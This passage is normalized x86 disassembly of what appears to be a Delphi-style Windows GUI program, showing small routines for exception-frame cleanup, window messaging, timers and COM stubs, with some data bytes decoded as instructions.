mov esi edx
mov ebx eax
mov eax ebx
call sub_45956c
mov edx eax
mov eax esi
call sub_41f7a4
pop esi
pop ebx
retn
sub_459550
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45a910
mov edx eax
mov eax esi
call sub_41f7a4
pop esi
pop ebx
retn
sub_45956c
push ebx
mov ebx eax
mov eax ebx
call sub_45a5b0
mov edx r-xdata
call sub_423c48
pop ebx
retn
sub_459670
push ebx
mov ebx eax
mov eax ebx
call sub_459680
xor al 0x1
pop ebx
retn
sub_459680
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_4596dc
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_4596fc
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_45971c
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_459a15
jmp sub_403970
sub_459a1c
pop ecx
pop ebp
retn
sub_459a20
xor eax eax
retn
sub_459cf8
jmp sub_403970
sub_459cff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40321c
retn
sub_459d15
jmp sub_403970
sub_459dff
jmp sub_403970
sub_459e06
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459e23
mov eax [ ebp - 0xc ]
call sub_40321c
retn
sub_459e1c
jmp sub_403970
sub_459e43
jmp sub_403970
sub_45a12e
jmp sub_403970
sub_45a2c1
jmp sub_403970
sub_45a2fe
add al [ eax ]
add [ edx + ebp - 0x75 ] dh
retn 0x8688
sub_45a5b0
mov eax [ eax + 0x238 ]
retn
sub_45a5b8
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_45a5c4
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_45a902
jmp sub_403970
sub_45a909
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a910
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_45a958
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_44462c
sub_45a974
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_45a9b0
push ebx
mov ebx eax
mov eax ebx
call sub_4465c0
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_423684
sub_45aa34
push ebx
mov ebx eax
mov eax ebx
call sub_4465e8
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_423cec
sub_45aa54
push ebx
mov ebx eax
mov eax ebx
call sub_45a674
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_45a73c
pop ebx
retn
sub_45b281
lea eax [ ebp - 0xb4 ]
call sub_403f6c
retn
sub_45b28d
jmp sub_403970
j_sub_45b281
jmp sub_45b281
sub_45b294
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45b3ec
jmp sub_403970
sub_45b3f3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b6d8
jmp sub_403970
sub_45b6df
mov eax [ rw-data ]
call sub_45df90
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b6f6
add [ eax ] al
retn
sub_45b954
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_45b974
mov eax [ eax + 0x240 ]
call sub_429b14
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_45fd30
sub_45ba1b
jmp sub_403970
sub_45ba22
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ba45
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_423cc4
retn
sub_45ba3e
jmp sub_403970
sub_45ba45
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45bc04
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45b974
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_45be6c
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_453bd4
sub_45bf57
jmp sub_403970
sub_45bf5e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45bf64
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_45b74c
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_45bfbc
call sub_45cce4
retn
sub_45c409
jmp sub_403970
sub_45c410
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45c70c
jmp sub_4036bc
sub_45caa8
jmp sub_4036bc
sub_45cba1
jmp sub_403970
sub_45cba8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cbc5
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
sub_45cbbe
jmp sub_403970
sub_45cbc5
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45cbcc
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_429b14
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_459614
sub_45cbec
call sub_40321c
retn
sub_45cc44
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_45ccaa
jmp sub_403970
sub_45ce58
jmp sub_4036bc
sub_45ce84
xor edx edx
call sub_459978
retn
sub_45ce8c
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_459978
mov eax ebx
call sub_440b04
pop ebx
retn
sub_45cf12
jmp sub_403970
sub_45cf19
pop ebx
pop ecx
pop ebp
retn
sub_45cf20
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_4470c4
push eax
call PostMessageA
pop ebx
retn
sub_45d124
jmp sub_403970
sub_45d1c5
jmp sub_403970
sub_45d1cf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d1ee
mov eax [ rw-data ]
call sub_45f408
retn
sub_45d1e7
jmp sub_403970
sub_45d1ee
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d20b
lea eax [ ebp - 0x20 ]
call sub_403f6c
retn
sub_45d204
jmp sub_403970
sub_45d20b
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d2ec
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_43fcb0
retn
mov edx eax
mov eax [ rw-data ]
call sub_45ea5c
retn
sub_45d670
mov edx eax
mov eax [ rw-data ]
call sub_460524
mov al 0x1
retn
sub_45d758
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_45d680
sub_45d76c
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_45d680
sub_45d780
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_45d680
sub_45d794
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_45d680
sub_45d7a8
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_45d913
jmp sub_403970
sub_45d91a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d920
push ebx
mov ebx eax
mov eax ebx
call sub_4459a4
mov eax ebx
call sub_445b28
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45cf20
sub_45db96
jmp sub_403970
sub_45db9d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45dba4
push ebx
mov ebx edx
mov edx ebx
call sub_445e0c
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_43fdb8
pop ebx
retn
sub_45dbf8
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45dc60
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_45dc10
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45dc60
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_45dc2c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45dc60
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_45dc44
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45dc60
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_45dee0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45deec
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45def8
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45df04
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45df10
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45df1c
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45df28
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_41a19c
pop esi
pop ebx
retn
sub_45df3c
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45df58
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41a19c
pop esi
pop ebx
retn
sub_45df6c
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_45df74
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41a19c
pop esi
pop ebx
retn
sub_45df88
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_45e064
mov eax [ eax + 0x54 ]
call sub_41a040
retn
sub_45e070
mov eax [ eax + 0x54 ]
call sub_41a2e0
retn
sub_45e2c3
jmp sub_403970
sub_45e307
jmp sub_403970
sub_45e30e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_45e35c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45e15c
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_403fc0
pop esi
pop ebx
retn
sub_45e3c8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_41a19c
pop esi
pop ebx
retn
sub_45e3dc
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_45e5e1
jmp sub_403970
sub_45e5e8
pop ebx
mov esp ebp
pop ebp
retn
sub_45e5f0
inc [ eax + 0x8c ]
retn
sub_45e5f8
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_45e618
sub_45e618
xor edx edx
call sub_45ea5c
retn
sub_45ea4e
jmp sub_403970
sub_45ead5
jmp sub_403970
sub_45eae4
add eax 0x30
call sub_40d3ac
retn
sub_45eb28
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
sub_45eb79
jmp sub_4036bc
sub_45eb7e
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_460524
call sub_403a24
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_45f24d
jmp sub_403970
sub_45f254
pop ebx
mov esp ebp
pop ebp
retn
sub_45f3dc
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_45f408
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_45f434
xor edx edx
call sub_45f32c
retn
sub_45f43c
mov dl 0x1
call sub_45f32c
retn
sub_45f4b0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_45f4c8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_45f595
jmp sub_403970
sub_45f59c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45fce6
jmp sub_4036bc
sub_460006
jmp sub_403970
sub_46000d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_460278
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_4601e0
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
sub_46038c
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
sub_4603e2
jmp sub_4036bc
sub_4604c9
jmp sub_4036bc
sub_460502
jmp sub_403970
sub_460509
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_460510
call sub_40cefc
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_460709
jmp sub_403970
sub_460710
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4607d7
jmp sub_403970
sub_4607de
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4609b4
jmp sub_403970
sub_4609bb
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_460a1c
jmp sub_403970
sub_460a23
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_460a2c
call sub_4607f4
retn
sub_460c17
jmp sub_4036bc
sub_460c70
jmp sub_403970
sub_460c77
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460da5
jmp sub_403970
sub_460f04
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_461203
jmp sub_403970
sub_461232
jmp sub_403970
sub_46133e
jmp sub_403970
sub_461345
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4616d6
jmp sub_403970
sub_4616dd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461800
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_46184b
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_46185c
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_46186c
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_46187c
add [ eax ] eax
add [ eax ] al
or al 0xfe
inc esi
add al cl
iretd
sub_4618df
jmp sub_403970
sub_4618e6
pop ebp
retn
sub_4618e8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_46187c
call sub_403d40
call sub_461800
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_45750c
call sub_419c90
sub_461978
retn
sub_461979
jmp sub_403970
j_sub_461978
jmp sub_461978
sub_461980
pop ebp
retn
sub_461984
sub [ rw-data ] 0x1
retn
sub_461bef
jmp sub_403970
sub_461c8a
jmp sub_403970
sub_461cb0
push ebx
mov ebx eax
push ebx
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_461b48
call sub_4039a8
pop ebx
retn
sub_461eb8
jmp sub_403970
sub_461ebf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461f64
jmp sub_403970
sub_461f6b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_462016
jmp sub_403970
sub_46201d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_462228
jmp sub_403970
sub_46222f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462548
jmp sub_403970
sub_46254f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462572
lea eax [ ebp - 0x50 ]
mov edx [ r-xdata ]
call sub_4049d4
retn
sub_46256b
jmp sub_403970
sub_462572
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_462690
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
retn
sub_462809
jmp sub_403970
sub_462810
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_462818
push 0x0
xor ecx ecx
call sub_462744
retn
sub_462824
xor ecx ecx
mov edx 0x20
call sub_402c30
retn
sub_462ae2
jmp sub_403970
sub_462ae9
pop ebp
retn
sub_462b91
jmp sub_403970
sub_462b98
pop ebp
retn
sub_462b9c
sub [ rw-data ] 0x1
retn
sub_462c57
add [ esp + 0x4 ] 0xfffffff4
jmp sub_462fd4
sub_462c61
add [ esp + 0x4 ] 0xfffffff4
jmp sub_462fe8
sub_462c75
add [ esp + 0x4 ] 0xfffffff4
jmp sub_462f20
sub_462c7f
add [ esp + 0x4 ] 0xfffffff4
jmp sub_462f84
sub_462c89
add [ esp + 0x4 ] 0xfffffff4
jmp sub_462fa4
sub_462ef4
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x1
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403540
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_462f74
add [ edx + eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
sub_462fd4
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
xor edx edx
mov [ eax ] edx
mov eax 0x80004001
pop ebp
retn 0x10
sub_462fe8
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x18
sub_463182
jmp sub_403970
sub_463189
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_463194
xor edx edx
mov [ eax + 0x4 ] edx
test edx edx
je r-xdata
mov al 0x1
retn
xor eax eax
retn
sub_46326c
retn
sub_4633ba
jmp sub_403970
sub_4633c1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4633c8
push ebx
mov ebx eax
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov al [ ebx + 0x48 ]
pop ebx
retn
mov al 0x3
pop ebx
retn
sub_4633dc
mov [ eax + 0x48 ] dl
retn
sub_4633e0
push ebx
mov ebx eax
mov eax ebx
call sub_4633c8
cmp al 0x4
jne r-xdata
mov al [ ebx + 0x40 ]
pop ebx
retn
xor eax eax
pop ebx
retn
sub_4633f8
mov [ eax + 0x40 ] dl
retn
sub_463424
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
inc [ eax + 0x34 ]
mov eax [ eax + 0x34 ]
pop ebp
retn 0x4
sub_463434
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec [ eax + 0x34 ]
mov eax [ eax + 0x34 ]
pop ebp
retn 0x4
sub_463469
jmp sub_403970
sub_463470
pop ebp
retn
sub_463474
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419a24
sub_4634b5
jmp sub_403970
sub_4634bc
pop ebp
retn
sub_4634c0
sub [ rw-data ] 0x1
retn
sub_4634ed
jmp sub_403970
sub_4634f4
pop ebp
retn
sub_4634f8
sub [ rw-data ] 0x1
retn
sub_463525
jmp sub_403970
sub_46352c
pop ebp
retn
sub_463530
sub [ rw-data ] 0x1
retn
sub_46355d
jmp sub_403970
sub_463564
pop ebp
retn
sub_463568
sub [ rw-data ] 0x1
retn
sub_4635fb
add [ esp + 0x4 ] 0xfffffff0
jmp sub_463d8c
sub_46360f
add [ esp + 0x4 ] 0xfffffff0
jmp sub_405a70
sub_4636c5
add eax 0xffffffe0
jmp sub_4642a0
sub_4636d7
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405a70
sub_4636eb
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax ]
xchg [ esp ] eax
retn
sub_4637f7
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405a70
sub_46380b
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax ]
xchg [ esp ] eax
retn
sub_463821
add [ esp + 0x4 ] 0xffffffdc
jmp sub_405a70
sub_463b03
jmp sub_403970
sub_463b0a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_463b6a
jmp sub_403970
sub_463b71
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_463bbb
jmp sub_403970
sub_463bc2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_463c48
cmp [ eax + 0x18 ] 0x0
jne r-xdata
retn
call sub_463cd8
sub_463cbc
jmp sub_403970
sub_463cc3
pop ebx
pop ecx
pop ebp
retn
sub_463cd8
push ebx
mov ebx eax
lea ecx [ ebx + 0x10 ]
mov edx r-xdata
mov eax [ ebx + 0xc ]
call sub_461f84
lea eax [ ebx + 0xc ]
call sub_40599c
pop ebx
retn
sub_463d6f
jmp sub_4036bc
sub_463d74
call sub_4639f4
mov ebx eax
call sub_403a24
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_463d8c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_463f4b
jmp sub_403970
sub_463f78
jmp sub_403970
sub_463f7f
pop ebx
mov esp ebp
pop ebp
retn
sub_4640ed
jmp sub_403970
sub_46411a
jmp sub_403970
sub_46426d
jmp sub_403970
sub_464274
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4642e6
lea eax [ ebp - 0x4 ]
call sub_40599c
retn
sub_4642ef
jmp sub_403970
j_sub_4642e6
jmp sub_4642e6
sub_4642f6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4643b6
jmp sub_403970
sub_4643bd
pop ecx
pop ecx
pop ebp
retn
sub_464479
jmp sub_403970
sub_46455d
jmp sub_403970
sub_464589
jmp sub_403970
sub_464650
retn
sub_464752
jmp sub_403970
sub_4648a4
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
pop ebx
retn
sub_4648fa
jmp sub_403970
sub_464901
pop ecx
pop ebp
retn
sub_464962
jmp sub_403970
sub_464969
pop ecx
pop ebp
retn
sub_46496c
retn
sub_464a27
jmp sub_403970
sub_464a2e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_464a83
jmp sub_403970
sub_464a8a
pop ebx
pop ecx
pop ebp
retn 0x4
sub_464acf
jmp sub_403970
sub_464ad6
pop ebx
pop ecx
pop ebp
retn 0x4
sub_464bcc
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x8000ffff
retn
push ecx
push edx
push eax
call [ rw-data ]
retn
sub_464c6f
jmp sub_403970
sub_464c76
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_464cd5
jmp sub_403970
sub_464cdc
pop ebp
retn
sub_464ce0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ r-xdata ]
push eax
xor ecx ecx
xor edx edx
mov eax [ r-xdata ]
call sub_425e08
call sub_464adc
sub_464d05
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4656f4
sub_464d0f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_465704
sub_464d19
add [ esp + 0x4 ] 0xfffffff8
jmp sub_465718
sub_464d23
add [ esp + 0x4 ] 0xfffffff8
jmp sub_465724
sub_464d2d
add [ esp + 0x4 ] 0xfffffff8
jmp sub_465664
sub_464d37
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4656cc
sub_464d41
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4656e0
sub_465596
jmp sub_403970
sub_46559d
pop ebx
pop ecx
pop ebp
retn
sub_465601
jmp sub_403970
sub_465608
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_465640
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403540
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_4656bb
add [ eax ] al
add al 0x2
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
sub_4656cc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call sub_467790
pop ebp
retn 0x4
sub_4656e0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call sub_4677a8
pop ebp
retn 0x4
sub_4656f4
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
xor eax eax
pop ebp
retn 0x8
sub_465704
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
xor edx edx
mov [ eax ] edx
mov eax 0x80004001
pop ebp
retn 0x10
sub_465718
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x18
j_sub_4036bc#9
jmp sub_4036bc
j_sub_4036bc#8
jmp sub_4036bc
sub_465d38
jmp sub_403970
sub_465d3f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_465efa
jmp sub_403970
sub_465f01
mov esp ebp
pop ebp
retn
j_sub_4036bc#7
jmp sub_4036bc
sub_465fea
jmp sub_403970
sub_465ff1
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_4036bc#6
jmp sub_4036bc
sub_466122
call sub_403a24
pop edi
pop esi
pop ebx
pop ebp
retn
j_sub_4037e8#3
jmp sub_4037e8
sub_4662a0
push ebx
mov ebx eax
mov eax [ ebx + 0x214 ]
test eax eax
je r-xdata
pop ebx
retn
push eax
call GlobalFree
xor eax eax
mov [ ebx + 0x214 ] eax
sub_4663d0
add esp 0xfffffff0
mov ecx esp
call sub_466404
mov ax [ esp + 0x8 ]
add esp 0x10
retn
sub_466486
jmp sub_403970
sub_46648d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4664e2
jmp sub_403970
sub_4664e9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4036bc#5
jmp sub_4036bc
j_sub_4036bc#4
jmp sub_4036bc
sub_46683a
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x8 ]
call sub_460524
call sub_403a24
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_466858
retn
sub_4669a9
jmp sub_403970
sub_4669b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4036bc#3
jmp sub_4036bc
sub_4669bf
mov eax [ ebp - 0x4 ]
call sub_4662a0
call sub_403a24
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_466a7c
call sub_466a9c
retn
sub_466a84
add esp 0xfffffff0
mov [ esp ] 0x9
mov [ esp + 0x8 ] ecx
mov ecx esp
call sub_466d6c
add esp 0x10
retn
sub_466a9c
add esp 0xfffffff0
mov [ esp ] 0x3
mov [ esp + 0x8 ] ecx
mov ecx esp
call sub_466d6c
add esp 0x10
retn
sub_466b5a
jmp sub_403970
sub_466b61
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_466b68
add esp 0xfffffff0
mov [ esp ] 0xb
test cx cx
je r-xdata
mov [ esp + 0x8 ] 0x0
mov [ esp + 0x8 ] 0xffff
jmp r-xdata
mov ecx esp
call sub_466d6c
add esp 0x10
retn
sub_466b94
call sub_466d6c
retn
j_sub_4036bc#2
jmp sub_4036bc
sub_466c6c
jmp sub_403970
sub_466c73
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_466d41
jmp sub_403970
sub_466d5e
jmp sub_403970
sub_466d65
pop edi
pop esi
pop ebx
